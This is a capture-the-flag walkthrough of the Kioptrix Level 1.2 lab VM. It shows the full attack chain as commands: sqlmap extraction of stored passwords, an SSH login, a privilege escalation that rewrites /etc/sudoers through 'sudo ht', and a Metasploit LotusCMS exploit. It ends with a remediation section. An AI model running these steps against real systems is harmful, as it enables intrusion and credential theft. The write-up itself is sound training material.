# Kioptrix: Level 1.2 (#3) — Databases, CMS, and a Hex Editor That Owns Root

Dude, Kioptrix Level 1.2 (Level 3) is where the series gets legitimately interesting. SQL injection on a gallery page, a virtual host requirement, credentials recovered from a database dump, SSH login with real credentials, and then one of the most creative privilege escalation paths in VulnHub history: using the `ht` hex editor with sudo to rewrite `/etc/sudoers` and grant yourself full root access. Goated technique. Also features LotusCMS (CVE-2011-0518) as an alternate initial access path, which is equally wild. No cap, this is a proper intermediate machine. fr fr.

The `loneferret` CompanyPolicy.README hint is a legendary CTF moment: you find the file, read "use ht as sudo," and the solution becomes obvious. Brilliant design.

---

| Field | Value |
|---|---|
| **Level** | Easy / Intermediate |
| **Target VM** | Kioptrix: Level 1.2 (#3) |
| **Attacker VM** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/kioptrix-level-12-3,24/ |
| **Techniques** | Nmap service enumeration, virtual host configuration, SQL injection via sqlmap, SSH login with recovered credentials, sudo ht hex editor privilege escalation (sudoers rewrite), LotusCMS RCE (CVE-2011-0518, alternate path) |
| **CVEs** | CWE-89 (SQL Injection in gallery.php: URL parameter injection); CVE-2011-0518 (LotusCMS 3.0 PHP eval injection via Router.php, alternate path); CWE-269 (Improper Privilege Management: sudo ht NOPASSWD on hex editor equivalent to unrestricted root) |
| **APT Groups** | SQL injection credential extraction is a documented initial access technique for APT28 and APT41; sudo misconfiguration exploitation is used by OceanLotus (APT32) as a primary Linux privilege escalation path |

---

## Attack Summary

```
netdiscover → target: 192.168.1.101
    |
    v
nmap → HTTP (80), SSH (22)
    |
    v
browse http://192.168.1.101 → virtual host required: kioptrix3.com
    |
    v
echo "192.168.1.101 kioptrix3.com" >> /etc/hosts
    |
    v
browse kioptrix3.com → LotusCMS, gallery app
    |
    v
gallery.php?id=1' → SQL error confirmed
    |
    v
sqlmap -u "kioptrix3.com/gallery/gallery.php?id=1" --dbs --batch
    |
    v
dump dev_accounts → loneferret:starwars, dreg:Mast3r
    |
    v
ssh loneferret@192.168.1.101 → starwars
    |
    v
cat CompanyPolicy.README → "use ht as sudo"
    |
    v
sudo -l → (root) NOPASSWD: /usr/local/bin/ht
    |
    v
sudo ht /etc/sudoers → edit loneferret entry → ALL=(ALL) NOPASSWD: ALL
    |
    v
sudo su → uid=0(root)
    |
    v
cat /root/congrats.txt
```

---

## Methodology

1. Network discovery and full port scan
2. Add virtual host entry to `/etc/hosts`
3. Web application reconnaissance (LotusCMS, gallery)
4. SQL injection confirmation and exploitation with sqlmap
5. Recover SSH credentials from database dump
6. SSH login as `loneferret`
7. Read CompanyPolicy.README for sudo hint
8. Exploit sudo ht to rewrite `/etc/sudoers`
9. Escalate to root via `sudo su`

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24

nmap -sV -sC -p- 192.168.1.101
```

Key findings:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1
80/tcp open  http    Apache httpd 2.2.8 (LotusCMS)
```

Only two services. The entire attack runs through HTTP and SSH. Start with web application recon.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Virtual Host Configuration

Navigate to `http://192.168.1.101/`. The application returns an error or redirect because it requires a specific virtual host name.

Inspect the HTTP response headers or page content for the expected hostname. Add it to `/etc/hosts`:

```bash
echo "192.168.1.101 kioptrix3.com" >> /etc/hosts
```

Now browse to `http://kioptrix3.com/`. The LotusCMS installation is accessible.

**Why virtual hosts matter in CTFs:** Many CTF machines use virtual hosting to simulate real-world configurations where multiple domains resolve to the same IP. The hostname check is implemented by Apache's `ServerName` directive and the application's routing logic.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1083 — File and Directory Discovery

---

## Step 3 — SQL Injection Discovery

Browse the gallery section: `http://kioptrix3.com/gallery/gallery.php?id=1`

Append a single quote to test for SQL injection:

```
http://kioptrix3.com/gallery/gallery.php?id=1'
```

A MySQL error message should appear, confirming unparameterized SQL. The `id` parameter is directly interpolated into a SQL query.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application

---

## Step 4 — Database Extraction with sqlmap

Use sqlmap to enumerate databases and extract credentials:

```bash
# Enumerate databases
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" --dbs --batch

# Enumerate tables in the gallery database
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" -D gallery --tables --batch

# Dump the dev_accounts table
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" -D gallery -T dev_accounts --dump --batch
```

Recovered credentials from `dev_accounts`:

| Username | Password |
|---|---|
| loneferret | starwars |
| dreg | Mast3r |

The passwords may be stored as MD5 hashes. sqlmap can attempt to crack them automatically. If not cracked automatically, try a quick hash identification and cracking:

```bash
# Identify hash type
hash-identifier <hash>

# Crack with hashcat (MD5)
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Real-world note:** sqlmap automates the tedious process of SQL injection enumeration and is standard in penetration testing toolkits. In real engagements, the `--risk` and `--level` flags control how aggressive the testing is. Use `--batch` in CTF contexts; in real engagements, review each prompt carefully.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1552.001 — Credentials in Files

---

## Step 5 — SSH Login and Post-Access Recon

Log in via SSH with the recovered credentials:

```bash
ssh loneferret@192.168.1.101
# Password: starwars
```

Explore the home directory:

```bash
ls -la
cat CompanyPolicy.README
```

The `CompanyPolicy.README` contains a hint from the creator:

```
Hello new employee,
It is company policy here to use our newly installed software for editing, creating and viewing files.
The software installed is the ht editor, which can be run by typing ht.
At your request, your IT department has made it your default application for when you run sudo.
```

Translation: `sudo ht` is available. Check:

```bash
sudo -l
# (root) NOPASSWD: /usr/local/bin/ht
```

`ht` is a hex editor that can open any file. With root sudo, it can open and edit `/etc/sudoers`.

**MITRE ATT&CK:** T1078.003 — Valid Accounts: Local Accounts; T1083 — File and Directory Discovery

---

## Step 6 — Privilege Escalation via sudo ht

The `ht` editor with root sudo access to any file is a complete privilege escalation. Modify `/etc/sudoers` to grant unrestricted root access:

```bash
export TERM=xterm-color
sudo ht /etc/sudoers
```

In `ht`:
- Press `F3` to open a file (or navigate from current open file)
- Find the `loneferret` sudoers entry:

```
loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht
```

- Modify it to:

```
loneferret ALL=(ALL) NOPASSWD: ALL
```

- Press `F2` to save, then `F10` to exit (or Alt+F10)

```bash
# Escalate to root:
sudo su
id
# uid=0(root) gid=0(root) groups=0(root)

cd /root
cat congrats.txt
```

**Real-world note:** Interactive text editors in sudoers (vim, nano, ht, less) provide unrestricted root file system access. This is a consistently documented finding in Linux penetration tests. Any editor that allows opening arbitrary files and executing commands (vim's `:!cmd`, nano's `Ctrl+R Ctrl+X`, ht's ability to open and edit any file) bypasses all privilege controls.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo; T1222.002 — File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification

---

## Alternate Path: LotusCMS RCE (CVE-2011-0518)

LotusCMS 3.0 has a PHP eval injection vulnerability (CVE-2011-0518). The Metasploit module `exploit/multi/http/lcms_php_exec` exploits this directly:

```bash
msfconsole
use exploit/multi/http/lcms_php_exec
set RHOST 192.168.1.101
set URI /
exploit
```

From the Meterpreter shell, read MySQL credentials from the CMS config:

```bash
cat /var/www/gallery/gconfig.php
# Contains MySQL root password: fuckeyou
```

Access phpMyAdmin with these credentials, browse to the `gallery.dev_accounts` table for the same credentials, then pivot to SSH.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application (CVE-2011-0518)

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Notes |
|---|---|---|---|
| SSH credentials | loneferret:starwars | gallery.dev_accounts via sqlmap | SSH login |
| SSH credentials | dreg:Mast3r | gallery.dev_accounts via sqlmap | Alternative user |
| MySQL credentials | root:fuckeyou | /var/www/gallery/gconfig.php | Alternate path only |
| Root flag | congrats.txt | /root/congrats.txt | sudo ht sudoers rewrite |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | SQL injection in gallery URL parameter | URL parameter SQLi is in OWASP Top 10; sqlmap makes it trivially automated | Parameterize all SQL queries; input validation on all URL parameters |
| 2 | Credentials stored in database via SQLi | Database-extracted credentials provide lateral movement and initial access | Salted bcrypt for passwords; no reversible password storage |
| 3 | sudo ht (interactive hex editor) | Equivalent to unrestricted root access for any user with the sudo entry | Never allow interactive editors, interpreters, or pagers in sudoers |
| 4 | CompanyPolicy.README hinting at exploitation path | Real insiders and documentation sometimes reveal privileged access paths | Audit all documentation for sensitive access information before distribution |
| 5 | LotusCMS CVE-2011-0518 | EOL CMS platforms with public RCE exploits should be replaced immediately | CMS platforms require regular updates or replacement; EOL = unacceptable risk |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Initial Access | Initial Access | Exploit Public-Facing Application (SQLi) | T1190 |
| Credential Access | Credential Access | Credentials in Files (database dump) | T1552.001 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Discovery | Discovery | File and Directory Discovery | T1083 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |
| Privilege Escalation | Privilege Escalation | File and Directory Permissions Modification | T1222.002 |

---

## Remediation and Containment

### Technical Fixes

1. **Fix SQL injection in gallery.php**: Parameterized queries for all database interactions; input validation on URL parameters
2. **Remove sudo ht NOPASSWD**: Edit sudoers with `visudo`; never allow interactive editors in sudoers
3. **Upgrade LotusCMS**: Replace EOL CMS with a maintained platform; apply CVE-2011-0518 patches
4. **Restrict MySQL credentials**: Change default MySQL root password; bind to localhost
5. **Hash passwords with bcrypt**: Replace MD5 password storage with bcrypt; implement salting

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all CMS platforms; audit SQL queries in all web applications |
| Protect | Access Control | Sudo principle of least privilege; no interactive editors in sudoers |
| Protect | Data Security | Bcrypt password storage; no reversible password hashing |
| Detect | Anomalies and Events | Alert on sqlmap-pattern requests; WAF for SQL injection patterns |
| Respond | Response Planning | Reset all compromised credentials; patch SQL injection; review sudoers |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| SI-10 | Information Input Validation | Parameterized SQL; whitelist URL parameters |
| AC-6 | Least Privilege | Sudo restricted to specific, safe commands; no editors |
| IA-5 | Authenticator Management | Bcrypt with salts; no MD5 for passwords |
| SI-2 | Flaw Remediation | Upgrade LotusCMS; apply all CMS security patches |

### CISA KEV

CVE-2011-0518 (LotusCMS RCE) represents the class of unpatched CMS vulnerabilities addressed by CISA guidance on EOL software. SQL injection credential extraction maps to CISA AA21-321A (top exploited vulnerabilities), which identifies SQL injection as a consistently targeted initial access vector.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT Asset Inventory | MIL2 |

### MITRE D3FEND Countermeasures

- **D3-SQLP** — SQL Injection Prevention (parameterized queries in gallery.php)
- **D3-OAM** — Operating System Administrative Management (sudoers restriction; no editors)
- **D3-SU** — Software Update (LotusCMS upgrade; bcrypt migration)

---

## Final Thoughts

Kioptrix Level 1.2 is a gem. The SQLi to SSH credentials chain is textbook, but the `sudo ht` privilege escalation is what makes this machine memorable. Rewriting `/etc/sudoers` with a hex editor that you own through sudo is so elegant it borders on beautiful from a CTF design standpoint.

The CompanyPolicy.README hint is a master stroke: it is simultaneously realistic (companies do document privileged access in internal docs) and pedagogically valuable (it teaches you to read everything in the home directory). The LotusCMS alternate path adds extra depth for those who want to practice CVE exploitation.

This machine genuinely tests three different skill domains: web exploitation (SQLi), credential attack (database dump), and privilege escalation (sudo abuse). That is a proper intermediate box. gg no cap.

Thanks guys!! (❍ᴥ❍ʋ)
